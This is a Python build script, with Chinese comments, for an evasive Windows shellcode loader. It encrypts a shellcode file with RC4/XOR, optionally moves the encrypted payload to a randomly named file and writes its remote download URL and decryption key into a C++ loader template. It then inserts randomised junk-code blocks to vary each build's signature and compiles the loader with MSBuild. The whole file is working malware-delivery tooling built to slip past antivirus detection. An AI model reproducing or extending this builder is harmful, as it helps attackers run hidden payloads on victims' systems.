
import os
import shutil
import subprocess
import uuid
import random
import re

# 一组用于防止重复的标识符
used_identifiers = set()

def create_unique_identifier(tag, existing_identifiers):
    identifier = f"{tag}_{random.randint(0,9999)}"
    while identifier in existing_identifiers:
        identifier = f"{tag}_{random.randint(0,9999)}"
    existing_identifiers.add(identifier)
    return identifier

# 混淆代码模板函数
def obfuscation_template_1(unique_id):
    return f"""
        float unused_float_{unique_id} = {random.random()};
        unused_float_{unique_id} += {random.random()};
        unused_float_{unique_id} *= {random.randint(1, 10)};
        unused_float_{unique_id} -= unused_float_{unique_id};
    """

def obfuscation_template_2(unique_id):
    return f"""
        char unused_char_{unique_id} = 'A';
        for (int i_{unique_id} = 0; i_{unique_id} < 3; ++i_{unique_id}) {{
            unused_char_{unique_id}++;
        }}
        if (unused_char_{unique_id} == 'D') {{
            unused_char_{unique_id} = 'A';
        }}
    """

def obfuscation_template_3(unique_id):
    return f"""
        bool unused_bool_{unique_id} = false;
        if (unused_bool_{unique_id}) {{
            int unused_result_{unique_id} = {random.randint(1000, 9999)} / {random.randint(1, 9)};
        }}
    """

def obfuscation_template_4(unique_id):
    return f"""
        int unused_array_{unique_id}[5] = {{ {random.randint(0, 100)}, {random.randint(0, 100)}, {random.randint(0, 100)}, {random.randint(0, 100)}, {random.randint(0, 100)} }};
        for (int j_{unique_id} = 0; j_{unique_id} < 5; ++j_{unique_id}) {{
            unused_array_{unique_id}[j_{unique_id}] = 0;
        }}
    """

def obfuscation_template_5(unique_id):
    return f"""
        char unused_str_{unique_id}[] = "obfuscation";
        for (size_t k_{unique_id} = 0; k_{unique_id} < sizeof(unused_str_{unique_id}) - 1; ++k_{unique_id}) {{
            unused_str_{unique_id}[k_{unique_id}] = '*';
        }}
    """

# 随机选择一个混淆代码模板函数并应用它
def random_obfuscation_template(unique_id):
    templates = [
        obfuscation_template_1,
        obfuscation_template_2,
        obfuscation_template_3,
        obfuscation_template_4,
        obfuscation_template_5
    ]
    selected_template = random.choice(templates)
    return selected_template(unique_id)

# 插入混淆代码的主要函数
def insert_obfuscation_code(original_file_path, changed_file_path):
    with open(original_file_path, 'r', encoding="utf-8") as file:
        file_content = file.read()
    
    # 假设我们希望在每个函数定义前添加混淆代码
    pattern = re.compile(r"// INSERT_OBFUSCATION_HERE")
    
    def replacement(match):
        unique_id = create_unique_identifier("obf", used_identifiers)
        return random_obfuscation_template(unique_id) + match.group(0)
        
    obfuscated_content = pattern.sub(replacement, file_content)
    
    with open(changed_file_path, 'w', encoding="utf-8") as file:
        file.write(obfuscated_content)



def compile(key,user_encoder_path, user_loader_path, user_binary_path,user_shellcode_file,user_encode_shellcode_file,remote,remote_shellcode_url):    
    
    new_filename = ''
    shecode_encoder_exe_path = os.path.join(user_encoder_path, "shellcode_encoder.exe")
    cpp_tmp_path = os.path.join(user_loader_path,"DynamicallyGetAPI_temp.cpp")
    cpp_path = os.path.join(user_loader_path,"DynamicallyGetAPI.cpp")
    cpp_compile_file_path = os.path.join(user_loader_path,"DynamicallyGetAPI.vcxproj")
    binary_file_path = os.path.join(user_loader_path, "Release", "binaryfile.exe")
    

    try:
    #执行自写的shellcode加密工具，并将加密后的shellcode另存为encode_shellcode.bin
        result = subprocess.run([shecode_encoder_exe_path, "-i", user_shellcode_file, "-o", user_encode_shellcode_file, "-k", "\""+key+"\"", "-m", "rc4", "xor"], check=True)
        print("命令输出:")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
            # 如果命令执行失败，会抛出CalledProcessError异常
        print("命令执行出错:")
        print(e)
        print(f"错误输出: {e.stderr}")  # 打印标准错误输出
    except Exception as e:
        # 捕获其他可能的异常
        print("捕获到未知错误:")
        print(e)

    if remote:
        new_filename = f"{uuid.uuid4().hex[:10]}"
        new_file_path = os.path.join(user_binary_path, new_filename)
        shutil.move(user_encode_shellcode_file, new_file_path)
        remote_shellcode_url += new_filename

        # 读取syscall.c文件的内容
        with open(cpp_tmp_path, "r", encoding="utf-8") as syscall_file:
            syscall_contents = syscall_file.read()
        
        # 替换"#shellcode#"为实际的shellcode字符串
        syscall_key_updated = syscall_contents.replace('"#decode_key#"', f'"{key}"')
        syscall_shellcode_updated = syscall_key_updated.replace('"#URL#"', f'"{remote_shellcode_url}"')
        
        # 将更新后的内容写回syscall.c文件
        with open(cpp_path, "w", encoding="utf-8") as syscall_file:
            syscall_file.write(syscall_shellcode_updated)
        
        
    else:
        with open(cpp_tmp_path, "r", encoding="utf-8") as syscall_file:
            syscall_contents = syscall_file.read()
        
        # 替换"#shellcode#"为实际的shellcode字符串
        syscall_key_updated = syscall_contents.replace('"#decode_key#"', f'"{key}"')
        #syscall_shellcode_updated = syscall_key_updated.replace('"#encoded_shellcode#"', f'"{shellcode_str_form}"')
        

        # 将更新后的内容写回syscall.c文件
        with open(cpp_path, "w", encoding="utf-8") as syscall_file:
            syscall_file.write(syscall_key_updated)

    insert_obfuscation_code(cpp_path, cpp_path)

    try:
        result = subprocess.run(["MSBuild.exe", cpp_compile_file_path, "/p:Configuration=Release,Platform=x86", "/p:AssemblyName=binaryfile"], check=True)
        print("命令输出:")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
            # 如果命令执行失败，会抛出CalledProcessError异常
        print("命令执行出错:")
        print(e)
        print(f"错误输出: {e.stderr}")  # 打印标准错误输出
    except Exception as e:
        # 捕获其他可能的异常
        print("捕获到未知错误:")
        print(e)
    
    shutil.copy(binary_file_path, user_binary_path)
    return new_filename